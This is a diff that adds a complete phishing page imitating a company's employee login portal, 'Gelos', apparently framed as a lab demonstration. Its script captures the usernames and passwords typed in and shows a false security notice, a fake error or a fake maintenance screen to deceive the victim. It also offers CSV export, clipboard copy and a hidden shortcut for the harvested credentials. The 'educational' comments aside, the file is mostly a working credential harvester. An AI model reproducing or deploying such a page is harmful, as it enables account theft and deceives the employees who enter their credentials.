@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gelos - Employee Portal Login</title>
+    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A1NTU/9TU1P/U1NT/1NTU/9TU1P/U1NT/1NTU/9TU1P/U1NT/1NTU////AP///wD///8A////AP///wD///8A1NTU/////////////////////////////////9TU1P///wD///8A////AP///wD///8A////ANTU1P/////////////////////////////////U1NT///8A////AP///wD///8A////AP///wDU1NT/////////////////////////////////1NTU////AP///wD///8A////AP///wD///8A1NTU/////////////////////////////////9TU1P///wD///8A////AP///wD///8A////ANTU1P/////////////////////////////////U1NT///8A////AP///wD///8A////AP///wDU1NT/////////////////////////////////1NTU////AP///wD///8A////AP///wD///8A1NTU/////////////////////////////////9TU1P///wD///8A////AP///wD///8A////ANTU1P/////////////////////////////////U1NT///8A////AP///wD///8A////AP///wDU1NT/////////////////////////////////1NTU////AP///wD///8A////AP///wD///8A1NTU/9TU1P/U1NT/1NTU/9TU1P/U1NT/1NTU/9TU1P/U1NT/1NTU////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAP//AAD//wAA//8AAA==">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px;
+        }
+        
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .tagline {
+            font-size: 0.9em;
+            opacity: 0.8;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            font-size: 0.8em;
+            opacity: 0.7;
+        }
+        
+        .form-container {
+            padding: 40px;
+        }
+        
+        .welcome-text {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #34495e;
+        }
+        
+        .welcome-text h2 {
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .welcome-text p {
+            font-size: 0.9em;
+            color: #7f8c8d;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #34495e;
+            font-weight: 500;
+            font-size: 0.9em;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e1e8ed;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+            background-color: #fafbfc;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background-color: white;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-bottom: 20px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .forgot-password {
+            text-align: center;
+        }
+        
+        .forgot-password a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            background: #ecf0f1;
+            padding: 20px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #7f8c8d;
+            border-top: 1px solid #d5dbdb;
+        }
+        
+        .security-notice {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #e8f5e8;
+            border: 1px solid #c3e6c3;
+            border-radius: 5px;
+            font-size: 0.85em;
+            color: #2d5a2d;
+        }
+        
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c66;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 0.9em;
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 30px 25px;
+            }
+            
+            .header {
+                padding: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">GELOS</div>
+            <div class="tagline">Global Excellence in Logistics & Operations</div>
+            <div class="subtitle">Secure Employee Portal</div>
+        </div>
+        
+        <div class="form-container">
+            <div class="welcome-text">
+                <h2>Welcome Back</h2>
+                <p>Please sign in to access your employee portal</p>
+            </div>
+            
+            <div class="security-notice">
+                <strong>🔒 Security Notice:</strong> This is a secure connection. Your credentials are protected with enterprise-grade encryption.
+            </div>
+            
+            <div class="error-message" id="errorMessage">
+                Invalid credentials. Please check your username and password.
+            </div>
+            
+            <form id="loginForm" method="POST" action="">
+                <div class="form-group">
+                    <label for="username">Username or Email</label>
+                    <input type="text" id="username" name="username" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="login-btn">Sign In</button>
+                
+                <div class="forgot-password">
+                    <a href="#" onclick="showForgotPassword()">Forgot your password?</a>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; 2024 Gelos Corporation. All rights reserved.</p>
+            <p>For technical support, contact IT Help Desk: helpdesk@gelos.com</p>
+        </div>
+    </div>
+    
+    <script>
+        // Store credentials (for educational demonstration)
+        let capturedCredentials = [];
+        
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const timestamp = new Date().toISOString();
+            
+            // Store credentials
+            const credentials = {
+                username: username,
+                password: password,
+                timestamp: timestamp,
+                userAgent: navigator.userAgent,
+                ip: 'captured-in-lab' // In real scenario, this would be server-side
+            };
+            
+            capturedCredentials.push(credentials);
+            
+            // Log to console for educational purposes
+            console.log('=== CREDENTIALS CAPTURED ===');
+            console.log('Username:', username);
+            console.log('Password:', password);
+            console.log('Timestamp:', timestamp);
+            console.log('User Agent:', navigator.userAgent);
+            console.log('=============================');
+            
+            // In a real phishing scenario, this data would be sent to an attacker-controlled server
+            // For educational purposes, we'll simulate different responses
+            
+            // Always capture first, then decide on response
+            setTimeout(() => {
+                if (Math.random() > 0.3) {
+                    // Show error message to make it seem more legitimate
+                    document.getElementById('errorMessage').style.display = 'block';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    document.getElementById('username').focus();
+                } else {
+                    // Redirect to real company login or show "maintenance" message
+                    showMaintenanceMessage();
+                }
+            }, 500);
+            
+            // For educational purposes, show popup after capturing credentials
+            // Comment out this line if you want it to be more stealthy
+            setTimeout(() => {
+                if (confirm('🎓 EDUCATIONAL MODE: View captured credentials now?')) {
+                    exportCredentials();
+                }
+            }, 1000);
+        });
+        
+        function showMaintenanceMessage() {
+            document.body.innerHTML = `
+                <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #f8f9fa; font-family: 'Segoe UI', sans-serif;">
+                    <div style="background: white; padding: 40px; border-radius: 10px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 500px;">
+                        <h2 style="color: #e74c3c; margin-bottom: 20px;">🚧 System Maintenance</h2>
+                        <p style="color: #34495e; margin-bottom: 20px;">The employee portal is currently undergoing scheduled maintenance.</p>
+                        <p style="color: #7f8c8d; font-size: 0.9em;">Please try again later or contact IT support if this issue persists.</p>
+                        <div style="margin-top: 30px; padding: 15px; background: #ecf0f1; border-radius: 5px;">
+                            <strong>IT Help Desk:</strong> helpdesk@gelos.com<br>
+                            <strong>Phone:</strong> +61 1800 GELOS1
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function showForgotPassword() {
+            alert('Please contact IT Help Desk at helpdesk@gelos.com for password reset assistance.');
+        }
+        
+        // Enhanced credential management functions for educational analysis
+        function exportCredentials() {
+            if (capturedCredentials.length === 0) {
+                showCredentialPopup('No credentials have been captured yet.');
+                return;
+            }
+            
+            console.log('=== ALL CAPTURED CREDENTIALS ===');
+            capturedCredentials.forEach((cred, index) => {
+                console.log(`Entry ${index + 1}:`, cred);
+            });
+            console.log('================================');
+            
+            showCredentialPopup();
+            return capturedCredentials;
+        }
+        
+        function showCredentialPopup(message = null) {
+            const popup = document.createElement('div');
+            popup.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                font-family: 'Courier New', monospace;
+            `;
+            
+            const content = document.createElement('div');
+            content.style.cssText = `
+                background: #1a1a1a;
+                color: #00ff00;
+                padding: 30px;
+                border-radius: 10px;
+                max-width: 80%;
+                max-height: 80%;
+                overflow-y: auto;
+                border: 2px solid #00ff00;
+                box-shadow: 0 0 20px rgba(0,255,0,0.3);
+            `;
+            
+            if (message) {
+                content.innerHTML = `
+                    <h2 style="color: #ff6b6b; margin-bottom: 20px;">⚠️ CREDENTIAL HARVESTER STATUS</h2>
+                    <p style="font-size: 16px; margin-bottom: 20px;">${message}</p>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="background: #ff6b6b; color: white; border: none; padding: 10px 20px; 
+                                   border-radius: 5px; cursor: pointer; font-size: 14px;">Close</button>
+                `;
+            } else {
+                let credentialTable = `
+                    <h2 style="color: #00ff00; margin-bottom: 20px;">🎯 CAPTURED CREDENTIALS</h2>
+                    <p style="margin-bottom: 20px; color: #ffff00;">Total Entries: ${capturedCredentials.length}</p>
+                    <div style="margin-bottom: 20px;">
+                `;
+                
+                capturedCredentials.forEach((cred, index) => {
+                    credentialTable += `
+                        <div style="background: #2a2a2a; margin: 10px 0; padding: 15px; border-radius: 5px; border-left: 4px solid #00ff00;">
+                            <strong style="color: #ffff00;">Entry ${index + 1}:</strong><br>
+                            <strong>Username:</strong> <span style="color: #ff6b6b;">${cred.username}</span><br>
+                            <strong>Password:</strong> <span style="color: #ff6b6b;">${cred.password}</span><br>
+                            <strong>Timestamp:</strong> ${new Date(cred.timestamp).toLocaleString()}<br>
+                            <strong>Browser:</strong> ${cred.userAgent.split(' ')[0]}<br>
+                            <strong>IP:</strong> ${cred.ip}
+                        </div>
+                    `;
+                });
+                
+                credentialTable += `
+                    </div>
+                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                        <button onclick="downloadCSV()" 
+                                style="background: #4CAF50; color: white; border: none; padding: 10px 15px; 
+                                       border-radius: 5px; cursor: pointer; font-size: 14px;">📁 Download CSV</button>
+                        <button onclick="copyToClipboard()" 
+                                style="background: #2196F3; color: white; border: none; padding: 10px 15px; 
+                                       border-radius: 5px; cursor: pointer; font-size: 14px;">📋 Copy to Clipboard</button>
+                        <button onclick="clearCredentials()" 
+                                style="background: #ff9800; color: white; border: none; padding: 10px 15px; 
+                                       border-radius: 5px; cursor: pointer; font-size: 14px;">🗑️ Clear All</button>
+                        <button onclick="this.parentElement.parentElement.parentElement.remove()" 
+                                style="background: #f44336; color: white; border: none; padding: 10px 15px; 
+                                       border-radius: 5px; cursor: pointer; font-size: 14px;">❌ Close</button>
+                    </div>
+                `;
+                
+                content.innerHTML = credentialTable;
+            }
+            
+            popup.appendChild(content);
+            document.body.appendChild(popup);
+        }
+        
+        function downloadCSV() {
+            if (capturedCredentials.length === 0) return;
+            
+            let csvContent = "Username,Password,Timestamp,Browser,IP\n";
+            capturedCredentials.forEach(cred => {
+                const browser = cred.userAgent.split(' ')[0];
+                csvContent += `"${cred.username}","${cred.password}","${cred.timestamp}","${browser}","${cred.ip}"\n`;
+            });
+            
+            const blob = new Blob([csvContent], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `gelos_captured_credentials_${new Date().toISOString().split('T')[0]}.csv`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            window.URL.revokeObjectURL(url);
+        }
+        
+        function copyToClipboard() {
+            if (capturedCredentials.length === 0) return;
+            
+            let text = "=== GELOS CREDENTIAL HARVESTER RESULTS ===\n";
+            text += `Total Entries: ${capturedCredentials.length}\n`;
+            text += `Export Date: ${new Date().toLocaleString()}\n\n`;
+            
+            capturedCredentials.forEach((cred, index) => {
+                text += `Entry ${index + 1}:\n`;
+                text += `  Username: ${cred.username}\n`;
+                text += `  Password: ${cred.password}\n`;
+                text += `  Timestamp: ${new Date(cred.timestamp).toLocaleString()}\n`;
+                text += `  Browser: ${cred.userAgent.split(' ')[0]}\n`;
+                text += `  IP: ${cred.ip}\n\n`;
+            });
+            
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Credentials copied to clipboard!');
+            }).catch(() => {
+                // Fallback for older browsers
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('Credentials copied to clipboard!');
+            });
+        }
+        
+        function clearCredentials() {
+            if (confirm('Are you sure you want to clear all captured credentials? This action cannot be undone.')) {
+                capturedCredentials = [];
+                console.log('All captured credentials have been cleared.');
+                document.querySelector('[style*="position: fixed"]').remove();
+                alert('All credentials have been cleared.');
+            }
+        }
+        
+        // Make functions available globally for educational purposes
+        window.exportCredentials = exportCredentials;
+        window.downloadCSV = downloadCSV;
+        window.copyToClipboard = copyToClipboard;
+        window.clearCredentials = clearCredentials;
+        
+        // Add keyboard shortcut for quick access (Ctrl+Shift+E)
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'E') {
+                e.preventDefault();
+                exportCredentials();
+            }
+        });
+        
+        // Add some realism with fake loading
+        window.addEventListener('load', function() {
+            document.body.style.opacity = '0';
+            document.body.style.transition = 'opacity 0.3s ease';
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+            }, 100);
+        });
+    </script>
+</body>
+</html>
